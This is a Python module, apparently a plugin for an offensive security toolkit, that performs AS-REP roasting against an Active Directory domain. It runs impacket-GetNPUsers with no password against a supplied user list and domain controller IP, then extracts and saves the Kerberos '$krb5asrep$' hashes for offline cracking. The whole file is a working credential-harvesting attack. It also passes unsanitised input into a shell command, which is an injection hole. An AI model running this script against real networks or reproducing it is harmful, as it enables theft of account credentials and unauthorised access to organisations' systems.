def run(data, cred, args):
    import subprocess
    from pathlib import Path

    # ---------------- HELPERS ----------------
    def require_file(val, name):
        if not val:
            print(f"[!] Missing --{name}")
            return None

        path = Path(val).expanduser().resolve()

        if not path.exists():
            print(f"[!] File not found: {path}")
            return None

        return path

    # ---------------- INPUT ----------------
    users = require_file(args.file, "file")
    if not users:
        return

    # ---------------- OUTPUT ----------------
    output_path = args.out or "asrep_hashes.txt"
    output = Path(output_path).expanduser().resolve()

    # ---------------- COMMAND ----------------
    cmd = f"impacket-GetNPUsers {data['domain']}/ -no-pass -usersfile {users} -dc-ip {data['ip']}"

    print(f"[*] Running: {cmd}\n")

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    if result.stderr:
        print(result.stderr)

    # ---------------- PARSE ----------------
    hashes = [line for line in result.stdout.splitlines() if "$krb5asrep$" in line]

    if not hashes:
        print("[!] No hashes found")
        return

    # ---------------- WRITE ----------------
    output.write_text("\n".join(hashes))

    print(f"[+] Saved {len(hashes)} hashes → {output}")


    